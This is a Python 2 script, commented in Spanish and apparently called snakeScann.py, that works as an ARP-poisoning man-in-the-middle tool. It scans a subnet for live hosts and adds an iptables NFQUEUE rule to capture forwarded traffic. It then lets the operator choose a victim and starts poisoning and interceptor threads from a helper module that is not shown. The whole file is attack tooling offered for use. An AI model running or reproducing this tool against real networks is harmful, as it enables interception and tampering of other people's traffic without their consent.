from scapy.all import *
import snake_utils
import threading
import time
import os
import sys

def usage():
    print "Mensaje de uso: "
    print "se necesita especificar [interface] [target_subnet] [gateway_ip]"
    print "ejemplo: sudo python snakeScann.py wlp1s0 192.168.1.0/24 192.168.1.1"
    sys.exit(0)
"""
CONFIGURACIOES
"""
if len(sys.argv) != 4:
    usage()
else :
    interface = sys.argv[1]
    target_subnet = sys.argv[2]
    gateway_ip = sys.argv[3]
    #obtener la mac del gateway
    gateway_mac = snake_utils.get_mac(gateway_ip)
    # set our interface
    print "[*] Configuando Interface %s" % (interface)
    conf.iface = interface
    # turn off output
    conf.verb = 0

# All packets that should be filtered :
# If you want to use it as a reverse proxy for your machine
#iptablesr = "iptables -A OUTPUT -j NFQUEUE"

# If you want to use it for MITM :
iptablesr = "iptables -I FORWARD -j NFQUEUE --queue-num 0"
print("Aplicando reglas de iptables:")
print(iptablesr)
os.system(iptablesr)

print "-----------------------------"
time.sleep(2)
os.system("clear")
"""
fin configuraciones
"""

hosts_live = snake_utils.hosts_discovery(target_subnet)
if len(hosts_live) != 0 :
    try:
        scan_semaphore = True #trigger -> la respuesta 88 del cliente(user_reseponse=88)
        while scan_semaphore :
            print "Hosts descubiertos! "
            print "Total Hosts = %d" % len(hosts_live)
            print "id     IP                        MAC                     VENDOR"
            #Imprimir los host detectados
            for (i,(ip,mac,vendor)) in enumerate(hosts_live, start=0):
                print "[%d]-> %s         %s        %s " % (i,ip,mac,vendor)

            print "[99] -> Escanear nuevamente"
            print "[88] -> Envenenar IP"
            user_response = input("Respuesta: ")
            if user_response == 99 :
                hosts_live = snake_utils.hosts_discovery(target_subnet)
                os.system("clear")#limpiar pantalla
            else:
                if user_response == 88 :
                    scan_semaphore = False
                    target_host_poison = hosts_live[ input("Envenenar la [*]IP -> ") ]
                    target_ip_poison = target_host_poison[0]
                    target_mac_poison = target_host_poison[1]
                    print "[*] Comenzando ataque ARP-Poioning"
                    poison_thread = threading.Thread(target=snake_utils.poisoner, args=(gateway_ip, gateway_mac,target_ip_poison,target_mac_poison))
                    poison_thread.start()
                    time.sleep(2)
                    print "[*] Encendiendo el  intercepter..." 
                    intercepter_thread = threading.Thread(target=snake_utils.intercepter)
                    intercepter_thread.start()
                else :
                    print "Opcion no valida"
                    time.sleep(2)
                    os.system("clear")#limpiar pantalla
    except KeyboardInterrupt:
        print "[CTRL-C] Detectado! adios"
        sys.exit(0)
else :
    print "[!!!] NO SE DESCUBRIERON HOST :C"
    sys.exit(0)